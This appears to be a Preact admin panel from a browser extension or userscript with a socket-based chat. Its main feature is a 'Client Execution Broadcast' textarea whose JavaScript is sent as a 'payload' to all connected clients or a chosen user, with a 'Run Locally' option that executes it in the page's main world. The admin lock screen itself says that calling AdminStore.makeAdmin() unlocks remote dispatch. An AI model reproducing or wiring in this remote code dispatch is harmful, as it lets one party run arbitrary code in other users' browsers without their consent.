import { useState, useEffect } from "preact/hooks";
import { useAllislet } from "allislet";
import { Icon } from "../components/Icon";
import { AdminStore } from "../core/AdminStore";
import { SocketChatService, ChatUser } from "../core/SocketChatService";

export const meta = {
    id: "admin",
    label: "Admin Control",
    icon: "ph:shield-check-bold",
    order: 99,
};

export default function AdminView() {
    const { pageExec } = useAllislet();
    const chatService = SocketChatService.getInstance();

    const [isAdmin, setIsAdmin] = useState(AdminStore.isAdmin);
    const [remoteCode, setRemoteCode] = useState('console.log("Remote command executed!");');
    const [targetUser, setTargetUser] = useState("*");
    const [onlineUsers, setOnlineUsers] = useState<ChatUser[]>([]);
    const [statusMsg, setStatusMsg] = useState<string | null>(null);

    useEffect(() => {
        const unsubAdmin = AdminStore.subscribe((status) => {
            setIsAdmin(status);
        });

        const unsubUsers = chatService.onUserList((users) => {
            setOnlineUsers(users);
        });

        return () => {
            unsubAdmin();
            unsubUsers();
        };
    }, []);

    if (!isAdmin) {
        return (
            <div
                style={{
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    justifyContent: "center",
                    height: "100%",
                    gap: "12px",
                    color: "#f23f43",
                }}
            >
                <Icon icon="ph:lock-key-bold" size="48px" />
                <span style={{ fontWeight: 600, fontSize: "16px" }}>Admin Privilege Required</span>
                <span style={{ color: "#b5bac1", fontSize: "13px", textAlign: "center" }}>
                    Invoke <code>AdminStore.makeAdmin()</code> to unlock remote dispatch and moderation capabilities.
                </span>
            </div>
        );
    }

    const handleBroadcastCode = () => {
        if (!remoteCode.trim()) return;
        chatService.adminBroadcastRemoteCode(remoteCode, targetUser);
        setStatusMsg(`Dispatched payload to ${targetUser === "*" ? "all clients" : targetUser}`);
        setTimeout(() => setStatusMsg(null), 3500);
    };

    const handleRunLocally = () => {
        if (pageExec && remoteCode.trim()) {
            pageExec.runInMainWorld(remoteCode);
        }
    };

    const handleToggleMute = (user: ChatUser) => {
        chatService.adminMuteUser(user.username, !user.isMuted);
    };

    return (
        <div style={{ display: "flex", flexDirection: "column", gap: "12px", height: "100%", overflowY: "auto" }}>
            {/* Header Control */}
            <div
                style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    backgroundColor: "#111214",
                    border: "1px solid #2b2d31",
                    padding: "10px 14px",
                    borderRadius: "6px",
                }}
            >
                <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                    <Icon icon="ph:shield-check-bold" size="20px" color="#f0b232" />
                    <span style={{ fontWeight: 600, fontSize: "14px", color: "#f2f3f5" }}>
                        Admin Orchestrator
                    </span>
                </div>
                <button
                    onClick={() => AdminStore.revokeAdmin()}
                    style={{
                        backgroundColor: "#f23f43",
                        color: "#fff",
                        border: "none",
                        borderRadius: "4px",
                        padding: "4px 10px",
                        fontSize: "12px",
                        fontWeight: 600,
                        cursor: "pointer",
                    }}
                >
                    Revoke Rights
                </button>
            </div>

            {/* Remote Execution Section */}
            <div
                style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "8px",
                    backgroundColor: "#111214",
                    border: "1px solid #2b2d31",
                    padding: "12px",
                    borderRadius: "6px",
                }}
            >
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                    <span style={{ fontSize: "13px", fontWeight: 600, display: "flex", alignItems: "center", gap: "6px" }}>
                        <Icon icon="ph:terminal-bold" size="16px" /> Client Execution Broadcast
                    </span>
                    <div style={{ display: "flex", alignItems: "center", gap: "6px", fontSize: "12px" }}>
                        <span style={{ color: "#b5bac1" }}>Target:</span>
                        <select
                            value={targetUser}
                            onChange={(e) => setTargetUser((e.target as HTMLSelectElement).value)}
                            style={{
                                backgroundColor: "#1e1f22",
                                color: "#fff",
                                border: "1px solid #2b2d31",
                                borderRadius: "4px",
                                padding: "2px 6px",
                                fontSize: "12px",
                            }}
                        >
                            <option value="*">All Active Clients (*)</option>
                            {onlineUsers
                                .filter((u) => !u.isAdmin)
                                .map((u) => (
                                    <option key={u.username} value={u.username}>
                                        {u.username}
                                    </option>
                                ))}
                        </select>
                    </div>
                </div>

                <textarea
                    value={remoteCode}
                    onInput={(e) => setRemoteCode((e.target as HTMLTextAreaElement).value)}
                    rows={4}
                    style={{
                        backgroundColor: "#1e1f22",
                        color: "#50fa7b",
                        border: "1px solid #2b2d31",
                        borderRadius: "6px",
                        padding: "10px",
                        fontFamily: "monospace",
                        fontSize: "12px",
                        resize: "none",
                        outline: "none",
                    }}
                />

                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                    <div style={{ display: "flex", gap: "8px" }}>
                        <button
                            onClick={handleBroadcastCode}
                            style={{
                                backgroundColor: "#5865f2",
                                color: "#fff",
                                border: "none",
                                borderRadius: "4px",
                                padding: "6px 12px",
                                fontWeight: 600,
                                fontSize: "12px",
                                cursor: "pointer",
                                display: "flex",
                                alignItems: "center",
                                gap: "6px",
                            }}
                        >
                            <Icon icon="ph:broadcast-bold" size="14px" /> Broadcast Payload
                        </button>
                        <button
                            onClick={handleRunLocally}
                            style={{
                                backgroundColor: "#3f4248",
                                color: "#fff",
                                border: "none",
                                borderRadius: "4px",
                                padding: "6px 12px",
                                fontWeight: 600,
                                fontSize: "12px",
                                cursor: "pointer",
                            }}
                        >
                            Run Locally
                        </button>
                    </div>
                    {statusMsg && <span style={{ color: "#23a55a", fontSize: "12px" }}>{statusMsg}</span>}
                </div>
            </div>

            {/* Moderation Roster */}
            <div
                style={{
                    backgroundColor: "#111214",
                    border: "1px solid #2b2d31",
                    borderRadius: "6px",
                    padding: "12px",
                    display: "flex",
                    flexDirection: "column",
                    gap: "8px",
                }}
            >
                <span style={{ fontSize: "13px", fontWeight: 600, display: "flex", alignItems: "center", gap: "6px" }}>
                    <Icon icon="ph:users-three-bold" size="16px" /> User Moderation
                </span>

                <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "12px", color: "#dbdee1" }}>
                    <thead>
                        <tr style={{ borderBottom: "1px solid #2b2d31", textAlign: "left", color: "#949ba4" }}>
                            <th style={{ padding: "6px" }}>User</th>
                            <th style={{ padding: "6px" }}>Role</th>
                            <th style={{ padding: "6px" }}>Chat Permission</th>
                            <th style={{ padding: "6px" }}>Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        {onlineUsers.map((u) => (
                            <tr key={u.username} style={{ borderBottom: "1px solid #1e1f22" }}>
                                <td style={{ padding: "6px", fontWeight: 600 }}>{u.username}</td>
                                <td style={{ padding: "6px", color: u.isAdmin ? "#f0b232" : "#b5bac1" }}>
                                    {u.isAdmin ? "Admin" : "Standard"}
                                </td>
                                <td style={{ padding: "6px", color: u.isMuted ? "#f23f43" : "#23a55a" }}>
                                    {u.isMuted ? "Muted" : "Allowed"}
                                </td>
                                <td style={{ padding: "6px" }}>
                                    {!u.isAdmin && (
                                        <button
                                            onClick={() => handleToggleMute(u)}
                                            style={{
                                                backgroundColor: u.isMuted ? "#23a55a" : "#f23f43",
                                                color: "#fff",
                                                border: "none",
                                                padding: "3px 8px",
                                                borderRadius: "4px",
                                                fontSize: "11px",
                                                fontWeight: 600,
                                                cursor: "pointer",
                                            }}
                                        >
                                            {u.isMuted ? "Unmute" : "Mute"}
                                        </button>
                                    )}
                                </td>
                            </tr>
                        ))}
                    </tbody>
                </table>
            </div>
        </div>
    );
}